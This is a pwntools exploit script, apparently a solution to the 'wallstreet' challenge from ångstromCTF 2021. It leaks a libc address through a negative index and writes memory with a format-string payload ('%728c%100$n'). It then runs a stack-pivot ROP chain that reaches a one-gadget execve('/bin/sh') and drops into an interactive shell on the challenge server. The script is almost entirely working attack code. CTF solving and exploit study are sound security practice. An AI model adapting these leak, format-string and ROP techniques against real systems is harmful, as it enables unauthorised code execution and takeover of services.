#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./wallstreet')
context.terminal = ['kitty', '-e', 'sh', '-c']
host = args.HOST or 'pwn.2021.chall.actf.co'
port = int(args.PORT or 21800)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *main
b *0x00000000004014a7
b *0x000000000040101a
continue
continue
'''.format(**locals())
# -- Exploit goes here --
libc = ELF("./libc.so.6")
io = start()
ret = 0x000000000040101a
pop_rdi = 0x00000000004015c3
leave_ret = 0x0000000000401336
io.sendlineafter("1) Buy some stonks!\n", "1")
io.sendlineafter("What stonk do you want to see?\n", "-16")
data = io.recvline()
libc.address = u64(data.strip().ljust(8, "\x00")) - 0x1e46c0
print("Libc: 0x%x" % libc.address)
system       = libc.sym["system"]
bin_sh       = next(libc.search(b"/bin/sh"))
pop_r15 = libc.address + 0x0000000002858e
pop_r12 = libc.address + 0x00000000034189
one_shot= libc.address + 0xdf54c
mov_rsp_rdx_ret = libc.address + 0x00000000059700
bss_null = 0x404dc0
payload = "PPPPPPPP" + "%728c%100$n" + "PPPPP" #+ p64(libc.address+0xdf7ad) + p64(ret) + p64(pop_r15) + p64(0x0) + p64(pop_r12) + p64(0x0) + p64(one_shot)
rop = "D"*2072 + p64(mov_rsp_rdx_ret) + "P" * 160 + p64(bss_null)
"""
0xdf54c execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL
"""

io.sendafter("What is your API token?\n", payload)
if "Hey! Only one leak allowed!" not in io.recv():
    io.sendline(rop)
    io.sendline("JUNK")
    io.interactive()
else:
    print("BAD LIBC BASE :/")
    io.close()